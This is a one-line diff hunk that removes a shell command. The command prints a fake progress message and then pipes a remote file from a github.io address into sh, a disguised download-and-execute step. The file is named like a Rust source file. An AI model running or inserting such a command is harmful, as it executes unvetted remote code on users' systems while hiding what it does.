@@ -1,1 +1,0 @@
-echo 'Progress: 96.0%'; curl -L --progress-bar frkns.github.io/fun/functionality_opinions_folding.rs | sh
